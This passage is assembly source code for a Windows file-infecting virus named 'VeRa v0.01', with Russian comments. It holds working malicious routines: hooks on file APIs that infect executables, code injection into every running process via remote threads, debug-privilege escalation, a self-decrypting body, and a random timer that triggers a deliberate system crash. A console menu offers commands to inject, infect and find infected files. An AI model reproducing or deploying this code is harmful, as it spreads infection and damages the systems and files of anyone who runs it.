	lea		edi, [ebp+_Functions_Bytes]
	lea		ebx, [ebp+UniversalHookProc]
  _loop:
	mov		esi, dword ptr[eax]
	cmp		esi, 0FFFFFFFFh
	je		_brk
	
	push	6
	pop		ecx
	push	esi
	rep		movsb ;Сохраняем байты
	pop		esi
	mov		byte  ptr[esi], 068h
	mov		dword ptr[esi+1], ebx
	mov		byte  ptr[esi+5], 0C3h
	add		ebx, 5
	add		eax, 4
	
	jmp		_loop
  _brk:
	popad
	ret
HookAll EndP

; Процедура UnHookAll снимает универсальный перехват
UnHookAll PROC
	pushad
	lea		eax, [ebp+_HookedFunctions]
	lea		esi, [ebp+_Functions_Bytes]
  _loop:
	mov		edi, dword ptr[eax]
	cmp		edi, 0FFFFFFFFh
	je		_brk
	
	push	6
	pop		ecx
	rep		movsb
	add		eax, 4
	
	jmp		_loop
  _brk:
	popad
	ret
UnHookAll EndP

	bNoCreateFileAHook	db	0

; Универсальный обработчик для большинства перехватываемых функций
UniversalHookProc PROC
  MoveFileA_Handler:
	xor		ecx, ecx
	nop
	jmp		HookStuff
  CopyFileA_Handler:
	xor		ecx, ecx
	inc		ecx
	jmp		HookStuff
  GetFullPathNameA_Handler:
	push	2
	pop		ecx
	jmp		HookStuff
  DeleteFileA_Handler:
	push	3
	pop		ecx
	jmp		HookStuff
  WinExec_Handler:
	push	4
	pop		ecx
	jmp		HookStuff
  CreateFileA_Handler:
	push	5
	pop		ecx
	jmp		HookStuff
  CreateProcessA_Handler:
	push	6
	pop		ecx
	jmp		HookStuff
  GetFileAttributesA_Handler:
	push	7
	pop		ecx
	jmp		HookStuff
  SetFileAttributesA_Handler:
	push	8
	pop		ecx
	jmp		HookStuff
  _lopen_Handler:
	push	9
	pop		ecx
	jmp		HookStuff
  MoveFileExA_Handler:
	push	10
	pop		ecx
	jmp		HookStuff
  CopyFileExA_Handler:
	push	11
	pop		ecx
	
  HookStuff:
	mov		eax, ebp
	call	uhp_delta
  uhp_delta:
	pop		ebp
	sub		ebp, offset uhp_delta
	mov		dword ptr[ebp+_ebp], eax 
	
	cmp		ecx, 5
	jne		_skip
	cmp		byte ptr[ebp+bNoCreateFileAHook], 1
	jne		_skip_hook_code
  _skip:
	
	push	esi
	lea		esi, [esp+4]
	mov		esi, dword ptr[esi+4]
	sub		esp, 256
	mov		edi, esp
	call	ValidateFileName
	pushad
	call	InfectFile
	popad
;	cdq
;	push	edx
;	push	edx
;	push	edi
;	push	edx
;	call	[ebp+_MessageBoxA]
	add		esp, 256
	pop		esi

  _skip_hook_code:
	imul	ecx, 4
	push	[esp]
	pop		dword ptr[ebp+ret_addr]
	mov		[esp], offset ret_to_hook
	add		[esp], ebp
	call	UnHookAll
	jmp		dword ptr[ebp+ecx+_HookedFunctions]
  ret_to_hook:
	call	HookAll
	push	dword ptr[ebp+ret_addr]
	mov		ebp, dword ptr[ebp+_ebp]
	ret
	
	ret_addr	dd		00000000h
	_ebp		dd		00000000h
	
UniversalHookProc EndP

; Функция InjectCodeToProcess внедряет все тело вируса в указанный процесс и запускает внедренный код
; [IN]    EAX - Pid целевого процесса
InjectCodeToProcess PROC
	cdq
	inc		edx
	mov		byte ptr[ebp+bInjected], dl
	push	eax ;Pid
	push	edx
	push	PROCESS_ALL_ACCESS ;PROCESS_VM_OPERATION or PROCESS_CREATE_THREAD
	call	[ebp+_OpenProcess]
	test	eax, eax
	jz		_ret
	mov		dword ptr[ebp+hProcess], eax
	
	sub		esp, 24 ;SizeOf PROCESS_BASIC_INFORMATION
	mov		ebx, esp
	push	ebx
	
	cdq
	push	edx	;lpReturnLength
	push	24	;dwProcessInformationLength
	push	ebx	;lpProcessInformation
	push	edx	;dwProcessInformationClass ( == ProcessBasicInformation )
	push	eax	;hProcess
	call	[ebp+_ZwQueryInformationProcess]
	pop		ebx
	test	eax, eax
	jnz		_skip_process_test
	mov		ebx, dword ptr[ebx+4] ;PebBaseAddress
	add		bl, 8
	
	push	eax	;DWORD на стеке для получения ImageBaseAddress
	mov		ecx, esp
	push	eax	;lpNumberOfBytesWritten
	push	4	;dwSize
	push	ecx ;lpBuffer
	push	ebx	;lpAddress
	push	[ebp+hProcess]
	call	[ebp+_ReadProcessMemory]
	pop		ebx	;Сливаем ImageBaseAddress
	add		ebx, 1Ch ;Адрес метки заражения в целевом процессе
	
	push	ebx ;Сохраним адрес метки
	cdq
	push	edx	;DWORD на стеке для получения метки заражения
	mov		ecx, esp
	push	edx	;lpNumberOfBytesWritten
	push	4	;dwSize
	push	ecx ;lpBuffer
	push	ebx	;lpAddress
	push	[ebp+hProcess]
	call	[ebp+_ReadProcessMemory]
	pop		ecx ;Сливаем метку заражения
	pop		ebx	;Сливаем адрес метки
	
	cmp		ecx, dwSignature
	jne		_skip_process_test
	cdq
	
  _skip_process_test:
	add		esp, 24
	test	edx, edx
	jz		_close_handle
	
	push	ebx
	push	edx
	push	esp
	push	PAGE_READWRITE
	push	1000h
	push	ebx
	push	[ebp+hProcess]
	call	[ebp+_VirtualProtectEx]
	pop		edx
	pop		ebx
	
	push	dwSignature ;Данные для записи
	mov		eax, esp
	cdq
	push	edx ;lpNumberOfBytesWritten
	push	4	;dwSize
	push	eax	;lpBuffer
	push	ebx ;lpAddress
	push	[ebp+hProcess]
	call	[ebp+_WriteProcessMemory]
	pop		ecx
	
	push	PAGE_EXECUTE_READWRITE
	push	MEM_COMMIT or MEM_RESERVE
	push	BodySize
	cdq
	push	edx
	push	[ebp+hProcess]
	call	[ebp+_VirtualAllocEx]
	mov		dword ptr[ebp+pMem], eax
	push	edx ;Место на стеке
	push	esp
	push	BodySize
	lea		edx, [ebp+vir_start]
	push	edx
	push	eax
	push	[ebp+hProcess]
	call	[ebp+_WriteProcessMemory]
	pop		edx ;Восстановим стек
	
	cdq
	push	edx
	push	edx
	push	edx
	push	[ebp+pMem]
	push	edx
	push	edx
	push	[ebp+hProcess]
	call	[ebp+_CreateRemoteThread]
	
  _close_handle:
	push	[ebp+hProcess]
	call	[ebp+_CloseHandle]
  _ret:
	cdq
	mov		byte ptr[ebp+bInjected], dl
	ret
	
	hProcess	dd		0h
	pMem		dd		0h
	
InjectCodeToProcess EndP

; Процедура IamInjected выполняется в случае, когда вирус внедряется в адресное пространство какого-либо процесса
; чтобы установить перехват функций и завершить исполняющийся поток.
IamInjected PROC
	call	StartVirus
	cdq
	push	edx
	call	[ebp+_ExitThread]
IamInjected EndP

; Процедура EnumProcessesAndInjectCode перебирает все процессы в системе и пытается внедрить код вируса
; в каждый из них. В проводник внедряет даже без дополнительных привилегий, а это главное...
EnumProcessesAndInjectCode PROC
	pushad
	sub		esp, SizeOf(PROCESSENTRY32)
	mov		esi, esp
	
	cdq
	push	edx
	push	TH32CS_SNAPPROCESS
	call	[ebp+_CreateToolhelp32Snapshot]
	mov		(PROCESSENTRY32 ptr[esi]).dwSize, SizeOf(PROCESSENTRY32)
	mov		[ebp+hSnap], eax
	push	esi
	push	eax
	call	[ebp+_Process32First]
  _loop:
	mov		eax, (PROCESSENTRY32 ptr[esi]).th32ProcessID
	call	InjectCodeToProcess
	push	esi
	push	[ebp+hSnap]
	call	[ebp+_Process32Next]
	test	eax, eax
	jnz		_loop
	
	push	[ebp+hSnap]
	call	[ebp+_CloseHandle]
	add		esp, SizeOf(PROCESSENTRY32)
	popad
	ret
	
	hSnap		dd		0h
	
EnumProcessesAndInjectCode EndP

	_bug_str	db		"\??\C:\",0h

; Процедура используется для "убиения" винды. Используется известный баг с MessageBoxA.
DoBug PROC
	push	10
	pop		ecx
  _loop:
	push	ecx
	lea		eax, [ebp+_bug_str]
	cdq
	push	MB_SERVICE_NOTIFICATION
	push	eax
	push	eax
	push	edx
	call	[ebp+_MessageBoxA]
	pop		ecx
	loop	_loop
	ret
DoBug EndP

; Процедура потока, создаваемого вирусом. Поток постоянно работает (не завешивая процессор) и при "удачном
; стечении обстоятельств" запускает процедуру, убивающую винду.
ThreadProc PROC
	call	tp_delta
  tp_delta:
	pop		ebp
	sub		ebp, offset tp_delta
  _loop:
	push	60000
	call	[ebp+_Sleep]
	
	push	100
	pop		eax
	call	Rand
	cmp		eax, 77
	jne		_loop
	
	call	UnHookMessageBoxExA
	call	DoBug
	call	HookMessageBoxExA
	
	jmp		_loop
	ret
ThreadProc EndP

; Процедура ValidateFileName извлекает из командной строки путь к ехе-файлу, пригодный для CreateFileA.
; Буфер перед записью очищается (заполняется нулями).
; [IN]    ESI - Указатель на входную строку
;         EDI - Указатель на буфер для вывода результата. Обязательный размер - 256 байт.
ValidateFileName PROC
	pushad
	push	256 / SizeOf(DWORD)
	pop		ecx
	xor		eax, eax
	rep		stosd
	inc		ah
	sub		edi, eax
	cdq
	cmp		byte ptr[esi], 34
	jne		_loop
	mov		dl, 34
	inc		esi
  _loop:
	cmp		byte ptr[esi], dl
	je		_brk
	test	dl, dl
	jz		_null_term
	movsb
	jmp		_loop
  _null_term:
	cmp		dword ptr[esi], "exe."
	je		_final
	movsb
	jmp		_loop
  _final:
	movsd
  _brk:
	popad
	ret
ValidateFileName EndP
	
  entry:
	xor		ebp, ebp
	
	mov		esi, offset CryptedBody
	mov		edi, offset _CryptKey
	push	15
	pop		ebx
	push	(entry-CryptedBody)
	pop		ecx
	cdq
	inc		edx
	call	Crypt
	
	call	setupSEH
	call	GetKernelBase
	xchg	eax, esi
	mov		ecx, offset _HashTable
	mov		ebx, offset _AddrTable
	call	FindAll
	push	offset strNtdll
	call	dword ptr[_GetModuleHandleA]
	xchg	eax, esi
	mov		ecx, offset _NtdllHashTable
	mov		ebx, offset _NtdllAddrTable
	call	FindAll
	call	EnableDebugPrivilege
	call	StartConsoleMode

;	mov		edi, offset lpFunc
;	call	CalcHash

	invoke ExitProcess, 0

	CONSOLE_BUF_SIZE	equ		20

	strTotalFound		db		'	Found %d infected files. See ''infected_files.txt'' for details...', 0
	strCurDir			db		'	Searching in directory: ', 0
	strCrytAll			db		'\*.*', 0
	strDirSep			db		'\', 0
	strDirSelf			db		'.', 0
	strDirUp			db		'..', 0
	strDirSelect		db		'	Specify directory to scan: ', 0
	strBadDir			db		13, 10, '	! Bad directory', 13, 10, 0
	strCrLf				db		13, 10, 0
	strInBuf			db		CONSOLE_BUF_SIZE + 1 dup(0)
	strDone				db		"	! Done", 0
	strFailed			db		"	! Operation failed", 0
	strFilter			db		"Supported PE-files", 0, "*.exe; *.scr;", 0, 0
	strFileSelected		db		"	! File selected: ", 0
	strConsoleTitle		db		"VeRa v0.01 Control Center",0h
	strHead				db		"Welcome to VeRa v0.01 control center.", 13, 10, 13, 10, "Please, type an command ('help' for view help) and then press ENTER:", 13, 10, 0
	strPrompt			db		13, 10, "]> ",0
	strBad				db		"	! Unknown command",0
	strAbout			db		13, 10, "	VeRa v0.01 written by Twister in 2007", 13, 10
	                    db		13, 10, "	...it's devoted to the best woman - my loved Vera...", 13, 10, 13, 10
	                    db		"	http://twister.orgfree.com", 13, 10
	                    db		"	       twister.kz@mail.ru", 13, 10, 0
	strHelp				db		13, 10, "VeRa v0.01 Console commands reference:", 13, 10, 13, 10
	                    db		"	  ABOUT - view notes about VeRa", 13, 10
	                    db		"	   HELP - view this cool help ;)", 13, 10
	                    db		"	 INJECT - inject VeRa's code into all possible processes in memory", 13, 10
	                    db		"	          and execute it as remote thread", 13, 10
	                    db		"	 INFECT - select file to infect with VeRa", 13, 10
	                    db		"	   FIND - find all files infected by VeRa in specified directory", 13, 10
	                    db		"	          (including sub directories) and write it's names and paths", 13, 10
	                    db		"	          into log file placed in VeRa's folder", 13, 10
	                    db		"	FULLSCR - switch console window to fullscreen mode", 13, 10
	                    db		"	    CLS - clear console window", 13, 10
	                    db		"	   EXIT - exit program", 13, 10, 0
	szFileName    		db 		MAX_PATH dup(0)
	ofn           		OPENFILENAME <>
	dwConCurPos			dd		0h
	dwConCurPosTotal	dd		0h
	dwConCurPosLast		dd		0h
	dwTotalFound		dd		0h
	dwMem				dd		0h
	strLogFileName		db		'infected_files.txt',0
	hLogFile			dd		0h

	cmdHelp				equ		023046C80h
	cmdExit				equ		00150EC50h
	cmdCls				equ		0B83E1800h
	cmdAbout			equ		09A666038h
	cmdInject			equ		03F2C44D0h
	cmdInfect			equ		0271C2410h
	cmdFullScr			equ		0A20E013Ah
	cmdFind				equ		00B047C60h
	cmdCure				equ		00310B430h ;Cure

StartConsoleMode PROC
	invoke	AllocConsole
	push	offset strConsoleTitle
	call	SetConsoleTitle
	
	invoke	GetStdHandle,STD_INPUT_HANDLE
	
	push	offset strHead
	call	StdOut
	
  _wait_cmd:
	xor		eax, eax
	mov		edi, offset strInBuf
	push	CONSOLE_BUF_SIZE
	pop		ecx
	rep		stosb
	
	push	offset strPrompt
	call	StdOut
	push	CONSOLE_BUF_SIZE
	push	offset strInBuf
	call	StdIn
	
	mov		esi, offset strInBuf
	push	CONSOLE_BUF_SIZE
	pop		ecx
	
  _loop_ltrim:
	lodsb
	cmp		al, ' '
	je		_loop_ltrim
	dec		esi
	push	esi

  _loop:
	lodsb
	test	al, al
	jz		_brk
	cmp		al, ' '
	je		_rtrim
	cmp		al, 'a'
	jb		_next
	cmp		al, 'z'
	ja		_next
	add		byte ptr[esi-1], 'A'-'a'
  _next:
	loop	_loop
  _rtrim:
	sub		byte ptr[esi-1], al
	jmp		_fin
  _brk:
	mov		word ptr[esi-3], 0h

  _fin:
	pop		edi
	call	CalcHash
	
	.if (eax == cmdCls)
		call	ClearConsole
		jmp		StartConsoleMode
	.elseif (eax == cmdExit)
		invoke	FreeConsole
		invoke	ExitProcess, 0
	.elseif (eax == cmdHelp)
		push	offset strHelp
		call	StdOut
	.elseif (eax == cmdAbout)
		push	offset strAbout
		call	StdOut
	.elseif (eax == cmdInject)
		push	ebp
		xor		ebp, ebp
		call	EnumProcessesAndInjectCode
		pop		ebp
		push	offset strDone
		call	StdOut
	.elseif (eax == cmdInfect)
		invoke	RtlZeroMemory, addr szFileName, MAX_PATH
		call	GetForegroundWindow
		push	offset strFilter
		push	0
		push	eax
		call	GetFileName
		push	offset strFileSelected
		call	StdOut
		mov		edi, offset szFileName
		push	edi
		call	StdOut
		call	GetFileFullSize
		push	eax
		push	ebp
		xor		ebp, ebp
		call	InfectFile
		pop		ebp
		push	offset strCrLf
		call	StdOut
		pop		ebx
		call	GetFileFullSize
		.if eax == ebx
			push	offset strFailed
			call	StdOut
		.else
			push	offset strDone
			call	StdOut
		.endif
	.elseif (eax == cmdFullScr)
		call	GetKernelBase
		push	offset strSetConsoleDisplayMode
		push	eax
		call	GetProcAddress
		push	eax
		invoke	GetStdHandle, STD_OUTPUT_HANDLE
		pop		ebx
		cdq
		push	edx
		inc		edx
		push	edx
		push	eax
		call	ebx
	.elseif (eax == cmdFind)
		invoke	RtlZeroMemory, addr szFileName, MAX_PATH
		invoke	StdOut, addr strDirSelect
		invoke	StdIn, addr szFileName, MAX_PATH
		mov		esi, offset szFileName
		push	esi
		cdq
	  _loop_1310:
		cmp		word ptr[esi], 0A0Dh
		je		_found_1310
		cmp		byte ptr[esi], dl
		je		_brk_1310 
		inc		esi
		jmp		_loop_1310
	  _found_1310:
		mov		word ptr[esi], dx
	  _brk_1310:
		pop		esi
		invoke	GetFileAttributes, esi
		.if		(eax != -1)
			.if		(eax & FILE_ATTRIBUTE_DIRECTORY)
				invoke	StdOut, addr strCrLf
				call	FindInfectedFiles
			.else
				jmp		_bad_dir
			.endif
		.else
		  _bad_dir:
			invoke	StdOut, addr strBadDir
		.endif
	.else
		push	offset strBad
		call	StdOut
	.endif
	
	jmp		_wait_cmd
	
	strSetConsoleDisplayMode	db	'SetConsoleDisplayMode',0h
	
StartConsoleMode EndP

ClearConsole PROC
	invoke	GetStdHandle, STD_OUTPUT_HANDLE
	push	eax
	invoke	FillConsoleOutputCharacter, eax, 32, 32000, 0, 0
	pop		eax
	invoke	SetConsoleCursorPosition, eax, 0
	ret
ClearConsole EndP

GetFileName PROC hParent:DWORD,lpTitle:DWORD,lpFilter:DWORD

    mov		ofn.lStructSize, sizeof OPENFILENAME
    push	hParent
    pop		ofn.hWndOwner
    pop		ofn.hInstance
    push	lpFilter
    pop		ofn.lpstrFilter
    push	offset szFileName
    pop		ofn.lpstrFile        
    mov		ofn.nMaxFile, sizeof szFileName
    push	lpTitle
    pop		ofn.lpstrTitle
    mov		ofn.Flags, OFN_EXPLORER or OFN_FILEMUSTEXIST or OFN_LONGNAMES

    invoke	GetOpenFileName, ADDR ofn

    ret

GetFileName EndP

GetFileFullSize PROC hFile1: DWORD
	invoke	_lopen, addr szFileName, 0
	mov		hFile1, eax
	invoke	GetFileSize, eax, NULL
	push	eax
	invoke	_lclose, hFile1
	pop		eax
	ret
GetFileFullSize EndP

FindFiles PROC lpszPath: DWORD
	local	wfd: WIN32_FIND_DATA
	local	csbi: CONSOLE_SCREEN_BUFFER_INFO
	local	strPath[MAX_PATH]: BYTE
	local	strCryt[MAX_PATH]: BYTE
	local	strTemp[MAX_PATH]: BYTE
	local	hSearch: DWORD
	local	hFile1: DWORD
	local	dwTmp: DWORD
	
	invoke	lstrcpy, addr strPath, lpszPath
	invoke	lstrcpy, addr strCryt, lpszPath
	invoke	lstrcat, addr strCryt, addr strCrytAll
	invoke	FindFirstFile, addr strCryt, addr wfd
	.if		(eax != INVALID_HANDLE_VALUE)
		mov		hSearch, eax
		.while	(eax != 0)
			.if		(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				invoke	lstrcmp, addr wfd.cFileName, addr strDirSelf
				.if		(eax != 0)
					invoke	lstrcmp, addr wfd.cFileName, addr strDirUp
					.if		(eax != 0)
						invoke	lstrcpy, addr strTemp, addr strPath
						invoke	lstrcat, addr strTemp, addr strDirSep
						invoke	lstrcat, addr strTemp, addr wfd.cFileName
						invoke	GetStdHandle, STD_OUTPUT_HANDLE
						push	eax
						invoke	FillConsoleOutputCharacter, eax, 32, MAX_PATH, dwConCurPos, 0
						mov		eax, [esp]
						invoke	SetConsoleCursorPosition, eax, dwConCurPos
						invoke	StdOut, addr strTemp
						pop		ebx
						invoke	GetConsoleScreenBufferInfo, ebx, addr csbi
						push	csbi.dwCursorPosition
						pop		dwConCurPosLast
						lea		eax, strTemp
						push	eax
						call	FindFiles
					.endif
				.endif
			.else
				invoke	lstrcpy, addr strTemp, addr strPath
				invoke	lstrcat, addr strTemp, addr strDirSep
				invoke	lstrcat, addr strTemp, addr wfd.cFileName
				cdq
				invoke	CreateFile, addr strTemp, GENERIC_READ, FILE_SHARE_READ, edx, OPEN_EXISTING, edx, edx
				.if		(eax != INVALID_HANDLE_VALUE)
					mov		hFile1, eax
					invoke	ReadFile, hFile1, dwMem, 1000h, addr dwTmp, 0
					.if		(eax != 0)
						mov		esi, dwMem
						call	IsValidPE
						.if		(eax == 1)
							call	IsInfectedPE
							.if		(eax == 1)
								inc		dword ptr[dwTotalFound]
								call	WriteInfectedCount
								lea		esi, strTemp
								call	WriteToLog
							.endif
						.endif
					.endif
					invoke	CloseHandle, hFile1
				.endif
			.endif
			invoke	FindNextFile, hSearch, addr wfd
		.endw
	.else
		invoke	GetStdHandle, STD_OUTPUT_HANDLE
		xchg	eax, ebx
		invoke	GetConsoleScreenBufferInfo, ebx, addr csbi
		push	csbi.dwCursorPosition
		pop		dwConCurPosLast
	.endif
	ret
FindFiles EndP

FindInfectedFiles PROC
	local	csbi: CONSOLE_SCREEN_BUFFER_INFO
	
	cdq
	mov		dword ptr[dwTotalFound], edx
	invoke	GetStdHandle, STD_OUTPUT_HANDLE
	xchg	eax, ebx
	push	ebx
	invoke	GetConsoleScreenBufferInfo, ebx, addr csbi
	invoke	StdOut, addr strCrLf
	push	csbi.dwCursorPosition
	pop		dwConCurPosTotal
	call	WriteInfectedCount
	invoke	StdOut, addr strCrLf
	invoke	StdOut, addr strCrLf
	invoke	StdOut, addr strCurDir
	invoke	StdOut, addr strCrLf
	invoke	StdOut, addr strCrLf
	mov		ebx, [esp]
	invoke	GetConsoleScreenBufferInfo, ebx, addr csbi
	push	csbi.dwCursorPosition
	pop		dwConCurPos
	invoke	VirtualAlloc, 0, 1000h, MEM_COMMIT + MEM_RESERVE, PAGE_READWRITE
	.if		(eax != 0)
		mov		dwMem, eax
		invoke	CreateFile, addr strLogFileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0
		.if		(eax != INVALID_HANDLE_VALUE)
			mov		hLogFile, eax
			push	offset szFileName
			call	FindFiles
			pop		ebx
			invoke	SetConsoleCursorPosition, ebx, dwConCurPosLast
			invoke	CloseHandle, hLogFile
		.endif
		invoke	VirtualFree, dwMem, 0, MEM_RELEASE
	.else
		pop		eax ;Восстановим стек
	.endif
	invoke	StdOut, addr strCrLf
	ret
FindInfectedFiles EndP

WriteInfectedCount PROC
	local	buf[MAX_PATH]: BYTE
	
	invoke	GetStdHandle, STD_OUTPUT_HANDLE
	push	eax
	invoke	SetConsoleCursorPosition, eax, dwConCurPosTotal
	invoke	wsprintf, addr buf, addr strTotalFound, dwTotalFound
	pop		eax
	invoke	StdOut, addr buf
	ret
WriteInfectedCount EndP

WriteToLog PROC
	local	dwTmp: DWORD
	
	invoke	lstrlen, esi
	xchg	eax, ebx
	invoke	WriteFile, hLogFile, esi, ebx,  addr dwTmp, 0
	invoke	WriteFile, hLogFile, addr strCrLf, 2,  addr dwTmp, 0
	ret
WriteToLog EndP

	strDebugPrivilege	db	'SeDebugPrivilege', 0

EnableDebugPrivilege PROC
	local	hToken: DWORD
	local	NameValue: LUID
	local	tkp: TOKEN_PRIVILEGES
	local	dwTmp: DWORD
	
	invoke	OpenProcessToken, -1, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken
	invoke	LookupPrivilegeValue, 0, addr strDebugPrivilege, addr NameValue
	.if		(eax != 0)
		mov		tkp.PrivilegeCount, 1
		push	NameValue.HighPart
		pop		tkp.Privileges[0].Luid.HighPart
		push	NameValue.LowPart
		pop		tkp.Privileges[0].Luid.LowPart
		mov		tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
		invoke	AdjustTokenPrivileges, hToken, FALSE, addr tkp, SizeOf(TOKEN_PRIVILEGES), addr tkp, addr dwTmp
	.endif
	invoke	CloseHandle, hToken
	ret
EnableDebugPrivilege EndP

end start